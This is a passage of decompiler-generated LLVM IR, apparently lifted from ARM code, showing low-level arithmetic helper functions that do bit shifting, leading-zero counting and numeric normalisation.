  %v2_1d678 = zext i1 %v9_1d674 to i32
  %v3_1d678 = add i32 %v2_1d678, %v0_1d678
  %v1_1d67c = load i32, i32* @r3, align 4
  %v7_1d67c = shl i32 %v1_1d67c, %v1_1d668
  %v8_1d67c = add i32 %v7_1d67c, %v8_1d674
  store i32 %v8_1d67c, i32* %r0.global-to-local, align 4
  %v5_1d680 = and i32 %v1_1d67c, %v4_1d674
  %v6_1d680 = icmp ne i32 %v5_1d680, 0
  %v7_1d680 = ashr i32 %v1_1d67c, %v0_1d668
  %v9_1d680 = add i32 %v3_1d678, %v7_1d680
  %v10_1d680 = zext i1 %v6_1d680 to i32
  %v11_1d680 = add i32 %v10_1d680, %v9_1d680
  br label %dec_label_pc_1d6a4

dec_label_pc_1d688:                               ; preds = %dec_label_pc_1d664
  %v1_1d688 = add i32 %v0_1d668, -32
  %v1_1d68c = add i32 %v1_1d668, 32
  store i32 %v1_1d68c, i32* @lr, align 4
  %v0_1d694 = load i32, i32* @r3, align 4
  %v2_1d694 = add i32 %v1_1d668, 31
  %v3_1d694 = lshr i32 -2147483648, %v2_1d694
  %v4_1d694 = and i32 %v0_1d694, %v3_1d694
  %v5_1d694 = icmp ne i32 %v4_1d694, 0
  %v6_1d694 = shl i32 %v0_1d694, %v1_1d68c
  %v2_1d698 = or i32 %v6_1d694, 2
  %v2_1d698.v6_1d694 = select i1 %v5_1d694, i32 %v2_1d698, i32 %v6_1d694
  store i32 %v2_1d698.v6_1d694, i32* %ip.global-to-local, align 4
  %v0_1d69c = load i32, i32* @r0, align 4
  %v7_1d69c = ashr i32 %v0_1d694, %v1_1d688
  %v8_1d69c = add i32 %v0_1d69c, %v7_1d69c
  store i32 %v8_1d69c, i32* %r0.global-to-local, align 4
  %v0_1d6a0 = load i32, i32* @r1, align 4
  %v2_1d6a0 = and i32 %v0_1d694, 1073741824
  %v3_1d6a0 = icmp ne i32 %v2_1d6a0, 0
  %v4_1d6a0 = ashr i32 %v0_1d694, 31
  %v6_1d6a0 = add i32 %v0_1d6a0, %v4_1d6a0
  %v7_1d6a0 = zext i1 %v3_1d6a0 to i32
  %v8_1d6a0 = add i32 %v6_1d6a0, %v7_1d6a0
  br label %dec_label_pc_1d6a4

dec_label_pc_1d6a4:                               ; preds = %dec_label_pc_1d670, %dec_label_pc_1d688
  %storemerge = phi i32 [ %v11_1d680, %dec_label_pc_1d670 ], [ %v8_1d6a0, %dec_label_pc_1d688 ]
  %v0_1d6a4 = phi i32 [ %v11_1d680, %dec_label_pc_1d670 ], [ %v8_1d6a0, %dec_label_pc_1d688 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  %v1_1d6a4 = and i32 %v0_1d6a4, -2147483648
  store i32 %v1_1d6a4, i32* @r5, align 4
  %v1_1d6a8 = icmp sgt i32 %v0_1d6a4, -1
  call void @__pseudo_cond_branch(i1 %v1_1d6a8, i32 ptrtoint (i32* @global_var_1d6b8.1214 to i32))
  %v0_1d6ac = load i32, i32* %ip.global-to-local, align 4
  %v1_1d6ac = sub i32 0, %v0_1d6ac
  store i32 %v1_1d6ac, i32* %ip.global-to-local, align 4
  %v2_1d6ac = icmp eq i32 %v0_1d6ac, 0
  %v0_1d6b0 = load i32, i32* %r0.global-to-local, align 4
  %v2_1d6b0 = icmp eq i1 %v2_1d6ac, false
  %v5_1d6b0 = sext i1 %v2_1d6b0 to i32
  %v6_1d6b0 = sub i32 %v5_1d6b0, %v0_1d6b0
  store i32 %v6_1d6b0, i32* %r0.global-to-local, align 4
  %v7_1d6b0 = zext i1 %v2_1d6b0 to i32
  %v8_1d6b0 = icmp ne i32 %v6_1d6b0, %v7_1d6b0
  %v9_1d6b0 = icmp ne i32 %v0_1d6b0, -1
  %v10_1d6b0 = or i1 %v9_1d6b0, %v8_1d6b0
  %v11_1d6b0 = icmp ne i32 %v0_1d6b0, 0
  %v12_1d6b0 = select i1 %v2_1d6b0, i1 %v10_1d6b0, i1 %v11_1d6b0
  %v0_1d6b4 = load i32, i32* %r1.global-to-local, align 4
  %v5_1d6b4 = sext i1 %v12_1d6b0 to i32
  %v6_1d6b4 = sub i32 %v5_1d6b4, %v0_1d6b4
  store i32 %v6_1d6b4, i32* @r1, align 4
  ret i32 %v6_1d6b0

; uselistorder directives
  uselistorder i1 %v2_1d6b0, { 1, 2, 0 }
  uselistorder i32 %v0_1d6b0, { 1, 2, 0 }
  uselistorder i32 %v8_1d6a0, { 1, 0 }
  uselistorder i32 %v0_1d694, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v11_1d680, { 1, 0 }
  uselistorder i32 %v1_1d67c, { 1, 0, 2 }
  uselistorder i32 %v0_1d674, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %ip.global-to-local, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_1d6a4, { 1, 0 }
}

define i32 @function_1d6b8(i64 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1d6b8:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = trunc i64 %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_1d6b8 = load i32, i32* %r1.global-to-local, align 4
  %v3_1d6bc = icmp ult i32 %v0_1d6b8, 1048574
  br i1 %v3_1d6bc, label %dec_label_pc_1d700, label %dec_label_pc_1d6c0

dec_label_pc_1d6c0:                               ; preds = %dec_label_pc_1d6b8
  %v3_1d6c4 = icmp ult i32 %v0_1d6b8, 2097150
  br i1 %v3_1d6c4, label %dec_label_pc_1d6e4, label %dec_label_pc_1d6c8

dec_label_pc_1d6c8:                               ; preds = %dec_label_pc_1d6c0
  %v1_1d6c8 = urem i32 %v0_1d6b8, 2
  %v2_1d6c8 = icmp ne i32 %v1_1d6c8, 0
  %v3_1d6c8 = udiv i32 %v0_1d6b8, 2
  store i32 %v3_1d6c8, i32* %r1.global-to-local, align 4
  %v0_1d6cc = load i32, i32* %r0.global-to-local, align 4
  %v3_1d6cc = zext i1 %v2_1d6c8 to i32
  %v6_1d6cc = zext i32 %v0_1d6cc to i64
  %v7_1d6cc = sub i32 33, %v0_1d6cc
  %v8_1d6cc = zext i32 %v7_1d6cc to i64
  %v9_1d6cc = shl i64 %v6_1d6cc, %v8_1d6cc
  %v10_1d6cc = sub i32 32, %v0_1d6cc
  %v11_1d6cc = shl i32 %v3_1d6cc, %v10_1d6cc
  %v12_1d6cc = zext i32 %v11_1d6cc to i64
  %v14_1d6cc = or i64 %v12_1d6cc, %v9_1d6cc
  %v15_1d6cc = trunc i64 %v14_1d6cc to i32
  %v16_1d6cc = add i32 %v0_1d6cc, -1
  %v17_1d6cc = shl i32 1, %v16_1d6cc
  %v18_1d6cc = and i32 %v17_1d6cc, %v0_1d6cc
  %v19_1d6cc = icmp ne i32 %v18_1d6cc, 0
  store i32 %v15_1d6cc, i32* %r0.global-to-local, align 4
  %v0_1d6d0 = load i32, i32* @ip, align 4
  %v3_1d6d0 = zext i1 %v19_1d6cc to i32
  %v6_1d6d0 = zext i32 %v0_1d6d0 to i64
  %v7_1d6d0 = sub i32 33, %v0_1d6d0
  %v8_1d6d0 = zext i32 %v7_1d6d0 to i64
  %v9_1d6d0 = shl i64 %v6_1d6d0, %v8_1d6d0
  %v10_1d6d0 = sub i32 32, %v0_1d6d0
  %v11_1d6d0 = shl i32 %v3_1d6d0, %v10_1d6d0
  %v12_1d6d0 = zext i32 %v11_1d6d0 to i64
  %v14_1d6d0 = or i64 %v12_1d6d0, %v9_1d6d0
  %v15_1d6d0 = trunc i64 %v14_1d6d0 to i32
  store i32 %v15_1d6d0, i32* @ip, align 4
  %v0_1d6d4 = load i32, i32* @r4, align 4
  %v1_1d6d4 = add i32 %v0_1d6d4, 1
  store i32 %v1_1d6d4, i32* @r4, align 4
  %v3_1d6d8 = mul i32 %v1_1d6d4, 2097152
  %v2_1d6dc = icmp ugt i32 %v3_1d6d8, -4194305
  call void @__pseudo_cond_branch(i1 %v2_1d6dc, i32 ptrtoint (i32* @global_var_1d894.1215 to i32))
  br label %dec_label_pc_1d6e4

dec_label_pc_1d6e4:                               ; preds = %dec_label_pc_1d700, %dec_label_pc_1d6c0, %dec_label_pc_1d6c8
  %v0_1d6e4 = load i32, i32* @ip, align 4
  %v2_1d6e4 = icmp slt i32 %v0_1d6e4, 0
  %v6_1d6e4 = icmp eq i32 %v0_1d6e4, -2147483648
  %v1_1d6e8 = load i32, i32* %r0.global-to-local, align 4
  br i1 %v6_1d6e4, label %bb, label %dec_label_pc_1d6e4._crit_edge

bb:                                               ; preds = %dec_label_pc_1d6e4
  %v2_1d6e8 = urem i32 %v1_1d6e8, 2
  %v3_1d6e8 = icmp ne i32 %v2_1d6e8, 0
  br label %dec_label_pc_1d6e4._crit_edge

dec_label_pc_1d6e4._crit_edge:                    ; preds = %dec_label_pc_1d6e4, %bb
  %v1_1d6ec = phi i1 [ %v3_1d6e8, %bb ], [ %v2_1d6e4, %dec_label_pc_1d6e4 ]
  %v2_1d6ec = zext i1 %v1_1d6ec to i32
  %v3_1d6ec = add i32 %v2_1d6ec, %v1_1d6e8
  store i32 %v3_1d6ec, i32* %r0.global-to-local, align 4
  %v0_1d6f0 = load i32, i32* %r1.global-to-local, align 4
  %v1_1d6f0 = load i32, i32* @r4, align 4
  %v2_1d6f0 = and i32 %v1_1d6f0, 4096
  %v3_1d6f0 = icmp ne i32 %v2_1d6f0, 0
  %v4_1d6f0 = mul i32 %v1_1d6f0, 1048576
  %v6_1d6f0 = add i32 %v4_1d6f0, %v0_1d6f0
  %v7_1d6f0 = zext i1 %v3_1d6f0 to i32
  %v8_1d6f0 = add i32 %v7_1d6f0, %v6_1d6f0
  %v1_1d6f4 = load i32, i32* @r5, align 4
  %v2_1d6f4 = or i32 %v1_1d6f4, %v8_1d6f0
  store i32 %v2_1d6f4, i32* %r1.global-to-local, align 4
  ret i32 %v3_1d6ec

dec_label_pc_1d700:                               ; preds = %dec_label_pc_1d6b8
  %v0_1d700 = load i32, i32* @ip, align 4
  %v1_1d700 = icmp slt i32 %v0_1d700, 0
  %v2_1d700 = mul i32 %v0_1d700, 2
  store i32 %v2_1d700, i32* @ip, align 4
  %v0_1d704 = load i32, i32* %r0.global-to-local, align 4
  %v3_1d704 = mul i32 %v0_1d704, 2
  %v4_1d704 = zext i1 %v1_1d700 to i32
  %v5_1d704 = or i32 %v3_1d704, %v4_1d704
  store i32 %v5_1d704, i32* %r0.global-to-local, align 4
  %v9_1d704 = icmp ule i32 %v5_1d704, %v0_1d704
  %v10_1d704 = icmp ult i32 %v3_1d704, %v0_1d704
  %v11_1d704 = select i1 %v1_1d700, i1 %v9_1d704, i1 %v10_1d704
  %v3_1d708 = mul i32 %v0_1d6b8, 2
  %v4_1d708 = zext i1 %v11_1d704 to i32
  %v5_1d708 = or i32 %v4_1d708, %v3_1d708
  store i32 %v5_1d708, i32* %r1.global-to-local, align 4
  %v1_1d70c = and i32 %v3_1d708, 1048576
  %v2_1d70c = icmp eq i32 %v1_1d70c, 0
  %v0_1d710 = load i32, i32* @r4, align 4
  %v1_1d710 = add i32 %v0_1d710, -1
  store i32 %v1_1d710, i32* @r4, align 4
  br i1 %v2_1d70c, label %bb7, label %dec_label_pc_1d6e4

bb7:                                              ; preds = %dec_label_pc_1d700
  ret i32 %v5_1d704

; uselistorder directives
  uselistorder i32 %v0_1d704, { 1, 2, 0 }
  uselistorder i1 %v1_1d700, { 1, 0 }
  uselistorder i32 %v1_1d6e8, { 1, 0 }
  uselistorder i32 %v0_1d6e4, { 1, 0 }
  uselistorder i32 %v0_1d6d0, { 1, 0, 2 }
  uselistorder i32 %v0_1d6cc, { 0, 3, 2, 1, 4 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 4, 5, 6, 1, 2 }
  uselistorder label %dec_label_pc_1d6e4._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1d6e4, { 0, 2, 1 }
}

define i32 @function_1d718() local_unnamed_addr {
dec_label_pc_1d718:
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp33 = call i32 @__decompiler_undefined_function_0()
  %stack_var_12 = alloca i32, align 4
  %v0_1d718 = load i32, i32* @r1, align 4
  %v2_1d718 = icmp eq i32 %v0_1d718, 0
  br i1 %v2_1d718, label %bb38, label %bb

bb:                                               ; preds = %dec_label_pc_1d718
  br label %.thread

bb38:                                             ; preds = %dec_label_pc_1d718
  %v1_1d72410 = load i32, i32* @r0, align 4
  store i32 %v1_1d72410, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r0, align 4
  br label %.thread

.thread:                                          ; preds = %bb, %bb38
  %v0_1d780 = phi i32 [ %v0_1d718, %bb ], [ %v1_1d72410, %bb38 ]
  %v1_1d738 = phi i32 [ 20, %bb ], [ 52, %bb38 ]
  %v2_1d730 = icmp ugt i32 %v0_1d780, 65535
  br i1 %v2_1d730, label %bb39, label %.thread3

bb39:                                             ; preds = %.thread
  %v2_1d734 = and i32 %v0_1d780, 32768
  %v3_1d734 = icmp eq i32 %v2_1d734, 0
  %v4_1d734 = udiv i32 %v0_1d780, 65536
  br i1 %v3_1d734, label %.thread3, label %bb40

bb40:                                             ; preds = %bb39
  %v2_1d738 = add nsw i32 %v1_1d738, -16
  br label %.thread3

.thread3:                                         ; preds = %bb39, %.thread, %bb40
  %v1_1d744 = phi i32 [ %v1_1d738, %.thread ], [ %v1_1d738, %bb39 ], [ %v2_1d738, %bb40 ]
  %v1_1d740 = phi i32 [ %v0_1d780, %.thread ], [ %v4_1d734, %bb39 ], [ %v4_1d734, %bb40 ]
  %v2_1d73c = icmp ugt i32 %v1_1d740, 255
  br i1 %v2_1d73c, label %bb41, label %.thread4

bb41:                                             ; preds = %.thread3
  %v2_1d740 = and i32 %v1_1d740, 128
  %v3_1d740 = icmp eq i32 %v2_1d740, 0
  %v4_1d740 = udiv i32 %v1_1d740, 256
  br i1 %v3_1d740, label %.thread4, label %bb42

bb42:                                             ; preds = %bb41
  %v2_1d744 = add nsw i32 %v1_1d744, -8
  br label %.thread4

.thread4:                                         ; preds = %bb41, %.thread3, %bb42
  %v1_1d750 = phi i32 [ %v1_1d744, %.thread3 ], [ %v1_1d744, %bb41 ], [ %v2_1d744, %bb42 ]
  %v1_1d74c = phi i32 [ %v1_1d740, %.thread3 ], [ %v4_1d740, %bb41 ], [ %v4_1d740, %bb42 ]
  %v2_1d748 = icmp ugt i32 %v1_1d74c, 15
  br i1 %v2_1d748, label %bb43, label %.thread5

bb43:                                             ; preds = %.thread4
  %v2_1d74c = and i32 %v1_1d74c, 8
  %v3_1d74c = icmp eq i32 %v2_1d74c, 0
  %v4_1d74c = udiv i32 %v1_1d74c, 16
  br i1 %v3_1d74c, label %.thread5, label %bb44

bb44:                                             ; preds = %bb43
  %v2_1d750 = add nsw i32 %v1_1d750, -4
  br label %.thread5

.thread5:                                         ; preds = %bb43, %.thread4, %bb44
  %v1_1d758 = phi i32 [ %v1_1d750, %.thread4 ], [ %v1_1d750, %bb43 ], [ %v2_1d750, %bb44 ]
  %v1_1d760 = phi i32 [ %v1_1d74c, %.thread4 ], [ %v4_1d74c, %bb43 ], [ %v4_1d74c, %bb44 ]
  %v2_1d754 = icmp ugt i32 %v1_1d760, 3
  br i1 %v2_1d754, label %bb45, label %.thread6

bb45:                                             ; preds = %.thread5
  %v2_1d758 = add i32 %v1_1d758, -2
  br label %bb46

.thread6:                                         ; preds = %.thread5
  %v5_1d75c = udiv i32 %v1_1d760, 2
  %v6_1d75c = sub i32 %v1_1d758, %v5_1d75c
  br label %bb46

bb46:                                             ; preds = %bb45, %.thread6
  %v0_1d760 = phi i32 [ %v6_1d75c, %.thread6 ], [ %v2_1d758, %bb45 ]
  %v4_1d760 = udiv i32 %v1_1d760, 8
  %v5_1d760 = sub i32 %v0_1d760, %v4_1d760
  %v2_1d764 = add i32 %v5_1d760, -32
  %v4_1d764 = sub i32 31, %v5_1d760
  %v5_1d764 = and i32 %v4_1d764, %v5_1d760
  %v8_1d764 = icmp eq i32 %v5_1d760, 32
  %v6_1d768 = icmp slt i32 %v5_1d760, 32
  br i1 %v6_1d768, label %dec_label_pc_1d76c, label %dec_label_pc_1d78c

dec_label_pc_1d76c:                               ; preds = %bb46
  %v2_1d76c = add i32 %v5_1d760, -20
  %v7_1d770 = icmp sgt i32 %v2_1d764, -12
  br i1 %v7_1d770, label %dec_label_pc_1d774, label %dec_label_pc_1d788

dec_label_pc_1d774:                               ; preds = %dec_label_pc_1d76c
  %v1_1d778 = sub i32 32, %v5_1d760
  %v6_1d77c = shl i32 %v0_1d780, %v5_1d760
  store i32 %v6_1d77c, i32* @r0, align 4
  %v6_1d780 = lshr i32 %v0_1d780, %v1_1d778
  store i32 %v6_1d780, i32* %r1.global-to-local, align 4
  br label %.thread31

dec_label_pc_1d788:                               ; preds = %dec_label_pc_1d76c
  %v8_1d76c = icmp eq i32 %v2_1d76c, 0
  %v4_1d76c = add i32 %v5_1d760, 2147483616
  %v5_1d76c = and i32 %v2_1d76c, %v4_1d76c
  br label %dec_label_pc_1d78c

dec_label_pc_1d78c:                               ; preds = %bb46, %dec_label_pc_1d788
  %v1_1d798.in = phi i32 [ %v2_1d764, %bb46 ], [ %v2_1d76c, %dec_label_pc_1d788 ]
  %v6_1d798 = phi i32 [ %v2_1d764, %bb46 ], [ %v5_1d760, %dec_label_pc_1d788 ]
  %v2_1d798.in = phi i32 [ %v5_1d764, %bb46 ], [ %v5_1d76c, %dec_label_pc_1d788 ]
  %v0_1d798 = phi i1 [ %v8_1d764, %bb46 ], [ %v8_1d76c, %dec_label_pc_1d788 ]
  %v1_1d798 = icmp slt i32 %v1_1d798.in, 0
  %v2_1d798 = icmp slt i32 %v2_1d798.in, 0
  %v3_1d78c = xor i1 %v2_1d798, %v1_1d798
  %v4_1d78c = or i1 %v0_1d798, %v3_1d78c
  br i1 %v4_1d78c, label %bb47, label %bb48

bb47:                                             ; preds = %dec_label_pc_1d78c
  %v6_1d78c = sub i32 32, %v6_1d798
  store i32 %v6_1d78c, i32* @ip, align 4
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_1d78c, %bb47
  %v6_1d790 = shl i32 %v0_1d780, %v6_1d798
  store i32 %v6_1d790, i32* %r1.global-to-local, align 4
  br i1 %v4_1d78c, label %bb49, label %.thread31

bb49:                                             ; preds = %bb48
  %v6_1d794 = load i32, i32* @r0, align 4
  %v7_1d794 = load i32, i32* @ip, align 4
  %v12_1d794 = lshr i32 %v6_1d794, %v7_1d794
  %v13_1d794 = or i32 %v12_1d794, %v6_1d790
  store i32 %v13_1d794, i32* %r1.global-to-local, align 4
  %v11_1d798 = shl i32 %v6_1d794, %v6_1d798
  store i32 %v11_1d798, i32* @r0, align 4
  br label %.thread31

.thread31:                                        ; preds = %bb48, %dec_label_pc_1d774, %bb49
  %v6_1d7a0 = phi i32 [ %v6_1d780, %dec_label_pc_1d774 ], [ %v13_1d794, %bb49 ], [ %v6_1d790, %bb48 ]
  %v0_1d79c = load i32, i32* @r4, align 4
  %v2_1d79c = sub i32 %v0_1d79c, %v5_1d760
  store i32 %v2_1d79c, i32* %r4.global-to-local, align 4
  %v4_1d79c = xor i32 %v0_1d79c, %v5_1d760
  %v5_1d79c = xor i32 %v2_1d79c, %v0_1d79c
  %v6_1d79c = and i32 %v5_1d79c, %v4_1d79c
  %v7_1d79c = icmp slt i32 %v6_1d79c, 0
  %v8_1d79c = icmp slt i32 %v2_1d79c, 0
  %v5_1d7a0 = icmp slt i32 %v0_1d79c, %v5_1d760
  br i1 %v5_1d7a0, label %.thread8, label %bb50

bb50:                                             ; preds = %.thread31
  %v10_1d7a0 = mul i32 %v2_1d79c, 1048576
  %v11_1d7a0 = add i32 %v10_1d7a0, %v6_1d7a0
  %v7_1d7a4 = load i32, i32* @r5, align 4
  %v8_1d7a4 = or i32 %v7_1d7a4, %v11_1d7a0
  store i32 %v8_1d7a4, i32* %r1.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %.thread31, %bb50
  %v3_1d7ac = xor i1 %v8_1d79c, %v7_1d79c
  %v4_1d7ac = xor i1 %v3_1d7ac, true
  call void @__pseudo_cond_branch(i1 %v4_1d7ac, i32 %tmp33)
  %v0_1d7b0 = load i32, i32* %r4.global-to-local, align 4
  %v2_1d7b4 = sub i32 -32, %v0_1d7b0
  store i32 %v2_1d7b4, i32* %r4.global-to-local, align 4
  %v6_1d7b8 = icmp sgt i32 %v0_1d7b0, -32
  br i1 %v6_1d7b8, label %dec_label_pc_1d7bc, label %dec_label_pc_1d7fc

dec_label_pc_1d7bc:                               ; preds = %.thread8
  %v1_1d7bc = add i32 %v2_1d7b4, 12
  store i32 %v1_1d7bc, i32* %r4.global-to-local, align 4
  %v8_1d7c0 = icmp sgt i32 %v1_1d7bc, 0
  br i1 %v8_1d7c0, label %dec_label_pc_1d7e0, label %dec_label_pc_1d7c4

dec_label_pc_1d7c4:                               ; preds = %dec_label_pc_1d7bc
  %v1_1d7c4 = add i32 %v2_1d7b4, 32
  %v1_1d7c8 = sub i32 0, %v2_1d7b4
  %v0_1d7cc = load i32, i32* @r0, align 4
  %v6_1d7cc = lshr i32 %v0_1d7cc, %v1_1d7c4
  %v1_1d7d0 = load i32, i32* %r1.global-to-local, align 4
  %v7_1d7d0 = shl i32 %v1_1d7d0, %v1_1d7c8
  %v8_1d7d0 = or i32 %v7_1d7d0, %v6_1d7cc
  %v0_1d7d4 = load i32, i32* @r5, align 4
  %v7_1d7d4 = lshr i32 %v1_1d7d0, %v1_1d7c4
  %v8_1d7d4 = or i32 %v0_1d7d4, %v7_1d7d4
  store i32 %v8_1d7d4, i32* %r1.global-to-local, align 4
  %v2_1d7d8 = load i32, i32* %stack_var_12, align 4
  store i32 %v2_1d7d8, i32* %r4.global-to-local, align 4
  ret i32 %v8_1d7d0

dec_label_pc_1d7e0:                               ; preds = %dec_label_pc_1d7bc
  %v1_1d7e0 = sub i32 0, %v2_1d7b4
  %v1_1d7e4 = add i32 %v2_1d7b4, 32
  %v0_1d7e8 = load i32, i32* @r0, align 4
  %v6_1d7e8 = lshr i32 %v0_1d7e8, %v1_1d7e4
  %v1_1d7ec = load i32, i32* %r1.global-to-local, align 4
  %v7_1d7ec = shl i32 %v1_1d7ec, %v1_1d7e0
  %v8_1d7ec = or i32 %v7_1d7ec, %v6_1d7e8
  %v0_1d7f0 = load i32, i32* @r5, align 4
  store i32 %v0_1d7f0, i32* %r1.global-to-local, align 4
  %v2_1d7f4 = load i32, i32* %stack_var_12, align 4
  store i32 %v2_1d7f4, i32* %r4.global-to-local, align 4
  ret i32 %v8_1d7ec

dec_label_pc_1d7fc:                               ; preds = %.thread8
  %v0_1d7fc = load i32, i32* %r1.global-to-local, align 4
  %v6_1d7fc = lshr i32 %v0_1d7fc, %v2_1d7b4
  %v0_1d800 = load i32, i32* @r5, align 4
  store i32 %v0_1d800, i32* %r1.global-to-local, align 4
  %v2_1d804 = load i32, i32* %stack_var_12, align 4
  store i32 %v2_1d804, i32* %r4.global-to-local, align 4
  ret i32 %v6_1d7fc

; uselistorder directives
  uselistorder i32 %v2_1d7b4, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 %v2_1d79c, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1d79c, { 2, 0, 1, 3 }
  uselistorder i32 %v6_1d790, { 1, 0, 2 }
  uselistorder i32 %v2_1d764, { 1, 0, 2 }
  uselistorder i32 %v5_1d760, { 6, 0, 5, 7, 3, 8, 2, 4, 9, 10, 1, 12, 11 }
  uselistorder i32 %v4_1d74c, { 1, 0 }
  uselistorder i32 %v1_1d74c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1d740, { 1, 0 }
  uselistorder i32 %v1_1d740, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1d734, { 1, 0 }
  uselistorder i32 %v0_1d780, { 3, 1, 2, 4, 0, 5, 6 }
  uselistorder i32* %r1.global-to-local, { 0, 8, 1, 6, 2, 7, 3, 4, 5, 9, 10 }
  uselistorder i32 -12, { 3, 1, 2, 4, 16, 17, 5, 19, 20, 6, 21, 22, 18, 15, 14, 13, 12, 11, 23, 24, 25, 26, 10, 7, 9, 8, 27, 28, 29, 0 }
  uselistorder i32 -20, { 0, 2, 1 }
  uselistorder i32 -2, { 9, 10, 11, 2, 4, 5, 3, 12, 13, 14, 0, 6, 8, 7, 15, 21, 20, 22, 23, 24, 17, 16, 19, 18, 1 }
  uselistorder i32 -4, { 10, 0, 1, 53, 11, 49, 12, 20, 73, 74, 75, 6, 21, 22, 23, 76, 77, 78, 7, 24, 25, 26, 79, 80, 81, 8, 27, 28, 82, 19, 18, 83, 84, 85, 17, 16, 15, 14, 29, 30, 31, 32, 33, 5, 34, 3, 35, 4, 86, 13, 36, 45, 46, 47, 48, 37, 38, 61, 62, 63, 9, 64, 65, 66, 39, 60, 2, 40, 54, 55, 56, 57, 58, 59, 67, 68, 69, 70, 71, 72, 41, 50, 51, 52, 42, 43, 44 }
  uselistorder i32 15, { 8, 9, 3, 15, 10, 11, 12, 13, 0, 16, 1, 19, 18, 2, 14, 4, 5, 6, 7, 17 }
  uselistorder i32 -8, { 11, 12, 1, 40, 19, 20, 21, 22, 23, 24, 18, 17, 10, 16, 15, 14, 13, 25, 26, 27, 28, 29, 9, 44, 45, 30, 31, 32, 33, 34, 43, 46, 35, 47, 39, 36, 37, 38, 2, 41, 42, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32 128, { 13, 14, 8, 9, 6, 7, 10, 21, 20, 0, 1, 2, 11, 17, 18, 3, 4, 12, 19, 5, 16, 23, 15, 22 }
  uselistorder i32 255, { 8, 9, 5, 12, 13, 4, 6, 7, 11, 0, 1, 2, 3, 14, 10 }
  uselistorder i32 -16, { 2, 7, 8, 9, 10, 11, 12, 13, 14, 15, 6, 5, 4, 1, 16, 17, 18, 19, 20, 21, 3, 0, 22 }
  uselistorder i32 65536, { 1, 2, 3, 0, 4, 5, 6, 7, 9, 8, 14, 10, 15, 11, 16, 12, 17, 13, 18, 19, 20, 24, 21, 25, 22, 26, 23, 27, 29, 28, 30, 74, 73, 71, 75, 31, 32, 33, 34, 35, 36, 37, 38, 39, 72, 41, 40, 42, 44, 43, 45, 46, 47, 48, 49, 51, 50, 52, 55, 54, 53, 56, 57, 58, 61, 60, 59, 62, 64, 65, 63, 66, 68, 69, 67, 70 }
  uselistorder i32 32768, { 3, 4, 2, 7, 0, 1, 6, 5 }
  uselistorder i32 65535, { 3, 4, 1, 2, 5, 0 }
  uselistorder i32 52, { 1, 18, 3, 21, 13, 14, 4, 19, 20, 26, 27, 2, 28, 0, 29, 30, 5, 6, 7, 9, 8, 10, 16, 23, 17, 15, 24, 11, 22, 25, 12 }
  uselistorder i32 20, { 5, 41, 42, 2, 8, 47, 0, 27, 43, 44, 15, 16, 17, 18, 40, 52, 9, 53, 54, 3, 55, 48, 10, 28, 29, 37, 38, 39, 19, 11, 20, 21, 1, 56, 6, 12, 57, 45, 46, 4, 7, 30, 31, 32, 33, 22, 49, 23, 24, 25, 26, 34, 35, 36, 13, 50, 14, 51 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %.thread31, { 2, 0, 1 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %dec_label_pc_1d78c, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %.thread5, { 2, 0, 1 }
  uselistorder label %.thread4, { 2, 0, 1 }
  uselistorder label %.thread3, { 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_1d80c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
dec_label_pc_1d80c:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_1d80c = load i32, i32* @r4, align 4
  %v2_1d80c = icmp eq i32 %v0_1d80c, 0
  %v1_1d810 = xor i32 %arg3, 1048576
  store i32 %v1_1d810, i32* @r3, align 4
  br i1 %v2_1d80c, label %.thread, label %.thread1

.thread:                                          ; preds = %dec_label_pc_1d80c
  %v1_1d814 = load i32, i32* @r1, align 4
  %v2_1d814 = xor i32 %v1_1d814, 1048576
  store i32 %v2_1d814, i32* @r1, align 4
  store i32 1, i32* @r4, align 4
  br label %bb

.thread1:                                         ; preds = %dec_label_pc_1d80c
  %v1_1d81c = load i32, i32* @r5, align 4
  %v2_1d81c = add i32 %v1_1d81c, -1
  store i32 %v2_1d81c, i32* @r5, align 4
  br label %bb

bb:                                               ; preds = %.thread, %.thread1
  %v0_1d820 = call i32 @function_1d664()
  store i32 %v0_1d820, i32* %r0.global-to-local, align 4
  %v0_1d824 = load i32, i32* @r4, align 4
  %v0_1d824.off = add i32 %v0_1d824, 4194303
  %tmp = icmp ult i32 %v0_1d824.off, 2097152
  %v1_1d8b4 = load i32, i32* @r5, align 4
  %v1_1d8b4.off = add i32 %v1_1d8b4, 4194303
  %tmp44 = icmp ult i32 %v1_1d8b4.off, 2097152
  br i1 %tmp, label %.thread11, label %bb30

bb30:                                             ; preds = %bb
  br i1 %tmp44, label %bb37, label %dec_label_pc_1d830

dec_label_pc_1d830:                               ; preds = %bb30
  %v4_1d830 = icmp eq i32 %v1_1d8b4, %v0_1d824
